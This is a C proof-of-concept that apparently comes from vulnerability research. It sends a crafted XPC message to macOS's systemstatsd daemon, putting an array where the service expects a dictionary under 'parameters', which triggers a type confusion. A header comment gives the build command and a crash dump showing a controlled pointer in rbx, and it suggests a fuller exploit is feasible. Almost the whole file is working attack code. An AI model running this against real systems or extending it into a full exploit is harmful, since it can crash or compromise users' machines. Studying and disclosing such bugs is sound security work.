/*
   PoC for an XPC type confusion in systemstatsd.

   Compile with:
     clang -o xpc_systemstatsd_1{,.c} -framework CoreFoundation

   At the moment this causes an invalid access at a controlled pointer
   (%rbx). The crash reason (EXC_I386_GPFLT) is due to an attempt to access a
   non-canonical pointer (0x4242424242424242).

   It should be possible to craft a more elaborated exploit that eventually
   controls an Objective-C pointer.

   Authors: @rpaleari and @joystick

<cut>
...
Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
Exception Codes:       EXC_I386_GPFLT
...
Thread 4 crashed with X86 Thread State (64-bit):
  rax: 0x0000000000000001  rbx: 0x4242424242424242  rcx: 0x0000000000000001  rdx: 0x00000000365fc815
  rdi: 0x000000010cd1bd54  rsi: 0x4242424242424262  rbp: 0x000000010d386850  rsp: 0x000000010d386820
   r8: 0x0000000000000058   r9: 0x0000000000000aa0  r10: 0x0000000000002a00  r11: 0x00007fff8ba4bc7e
  r12: 0x000000010cd1bd53  r13: 0x000000010cd1bd53  r14: 0x0000000000000000  r15: 0x00007fd4e9500420
  rip: 0x00007fff8ba485d8  rfl: 0x0000000000010246  cr2: 0x00007fd4e982e000
...
</cut>
*/

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

int main(){
  xpc_connection_t conn =
    xpc_connection_create_mach_service("com.apple.systemstatsd", NULL, 0);
  assert(conn);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
      printf("Message received from connection:\n");
      char *desc = xpc_copy_description(event);
      printf("Reply: %s\n", desc);
      free(desc);
    });

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  assert(msg);

  /* Prepare the anonymous connection to allow target service to contact back
     the current process. This one is required to pass some preliminary checks
     performed by systemstatsd on parameter "connection". */
  xpc_object_t anon_conn;
  anon_conn = xpc_connection_create(NULL, NULL);
  xpc_connection_set_event_handler
    (anon_conn, ^(xpc_object_t conn) {
      xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
	  printf("Got a message from the anonymous connection\n");
	  char *desc = xpc_copy_description(event);
	  printf("Reply: %s\n", desc);
	  free(desc);
	});
    });
  xpc_connection_resume(anon_conn);

  /* Prepare our evil object. The object provided via the "parameters"
     dictionary entry is interpreted by systemstatsd as an XPC dictionary. */
  xpc_object_t objs[] = {
    xpc_string_create("AAAAAAAABBBBBBBB"),
    xpc_string_create("XXXXXXXX"),
  };
  xpc_object_t evil_array = xpc_array_create(objs, sizeof(objs)/sizeof(objs[0]));
  xpc_dictionary_set_value(msg, "parameters", evil_array);

  /* Finalize the provided XPC dictionary with some required fields. */
  xpc_dictionary_set_value(msg, "connection", xpc_endpoint_create(anon_conn));
  xpc_dictionary_set_string(msg, "data", "xxx");
  xpc_dictionary_set_string(msg, "tid", "xxx");
  xpc_dictionary_set_string(msg, "pid", "xxx");

  xpc_connection_resume(conn);
  xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t event) {
      char *desc = xpc_copy_description(event);
      printf("Reply: %s\n", desc);
      free(desc);
    });
  xpc_release(msg);

  printf("Message sent.\n");

  CFRunLoopRunInMode(kCFRunLoopDefaultMode, 10, TRUE);

  return 0;
}
